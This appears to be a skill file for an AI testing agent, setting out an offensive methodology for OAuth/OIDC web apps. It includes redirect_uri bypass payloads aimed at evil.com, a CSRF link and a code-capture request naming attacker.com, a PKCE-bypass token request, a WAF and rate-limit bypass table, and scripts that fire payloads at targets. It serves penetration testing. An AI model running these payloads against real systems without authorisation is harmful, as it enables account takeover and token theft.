---
name: web-10-oauth-oidc
sequence: web-10
category: auth
domain: web
description: "OAuth 2.0 / OIDC attack methodology for web applications: redirect_uri bypass, state parameter abuse, CSRF on OAuth flow, authorization code interception, PKCE bypass, scope escalation, and token leakage via Referer. Use when testing web OAuth implementations. See skills/auth/auth-02-oauth-oidc/ for full depth."
wordlist_ref: "wordlists/web/web-16-oauth-oidc/"
---

# OAuth / OIDC — Web Offensive Methodology

## Quick Workflow

1. **Map the OAuth flow**: identify authorization endpoint, redirect_uri, response_type, client_id, scope, state
2. **Test redirect_uri validation**: try open redirects, path traversal, subdomain bypass, URL encoding tricks
3. **Test state parameter**: remove it, set static value, test CSRF via missing/tampered state
4. **Exploit authorization code**: intercept code, replay, test PKCE bypass
5. **Escalate scope**: modify scope param, test token exchange with elevated scopes

---

## Web-Specific Attack Surface

### redirect_uri Bypass Techniques

```
redirect_uri=https://target.com/oauth/callback.evil.com   # subdomain
redirect_uri=https://target.com/oauth/callback//evil.com  # path confusion
redirect_uri=https://evil.com/redirect?url=https://target.com/oauth/callback  # open redirect
redirect_uri=https://target.com%2eevil.com  # URL encoding
redirect_uri=https://target.com:443@evil.com  # authority confusion
redirect_uri=////evil.com  # protocol-relative
```

### State Parameter CSRF

```html
<!-- Missing state → CSRF on OAuth account linking -->
<a href="https://target.com/oauth/authorize?client_id=123&redirect_uri=https://attacker.com&response_type=code">
  Click to link your account
</a>
```

### Authorization Code Interception

```http
GET /callback?code=a1b2c3d4e5f6g7h8&state=xyz HTTP/1.1
Referer: https://attacker.com/oauth_capture
```

**Test**: replay the code from attacker's session → if accepted, no sender-constraint.

---

## Token Leakage

### Referer Header Leak

```
GET /oauth/callback?code=SECRET HTTP/1.1
→ browser sends Referer to any external resource on the page (images, scripts, analytics)
```

### URL Fragment Leak (Implicit Flow)

```
GET /callback#access_token=SECRET HTTP/1.1
→ fragment not sent in HTTP, but:
  - Browser history stores it
  - Service Workers can access it
  - window.location.hash leaked via XSS
```

---

## PKCE Bypass

```http
# Normal: code_challenge=hash(code_verifier)
# Bypass: omit code_challenge entirely, or send empty code_verifier
POST /oauth/token
code=abc&code_verifier=&grant_type=authorization_code
```

---



## Hacker Mindset

**redirect_uri bypass is the most common OAuth vuln.** The spec says exact match, but implementations do substring match, prefix match, or regex match. `https://target.com/callback.evil.com` bypasses `target.com` checks.

**The state parameter is the only CSRF protection in OAuth.** If there's no state, or the state is static/predictable, an attacker can initiate an OAuth flow and have the victim complete it — linking the victim's account to the attacker's.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed



## Tools

- Burp Suite (manual testing + Intruder)
- curl / httpx
- Nuclei templates
- OAuth Scanner (Burp)


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

```bash
# Confirm — test redirect_uri bypass variants
bash agents/invoke.confirm.sh https://target.com/oauth/authorize redirect_uri

# Parameters — test state, scope, response_type manipulation
bash agents/invoke.parameters.sh https://target.com/oauth/authorize

# Payloads — exploit confirmed vectors
bash agents/invoke.payloads.sh https://target.com/oauth/authorize redirect_uri low
```

---

## Chaining

- **Open redirect + OAuth**: redirect_uri points to open redirect → authorization code lands with attacker
- **CSRF + OAuth account linking**: victim links attacker's social account → ATO
- **XSS + OAuth**: steal access token from localStorage → full API access

**For full methodology**, see `skills/auth/auth-02-oauth-oidc/SKILL.md` — includes SAML, FAPI, token exchange, DPoP, and mobile OAuth.

---

## Key References

- OAuth 2.1 spec (RFC 6749bis)
- OWASP OAuth Security Cheat Sheet
- CVE-2020-12800 (PKCE bypass), CVE-2022-23532 (redirect validation)
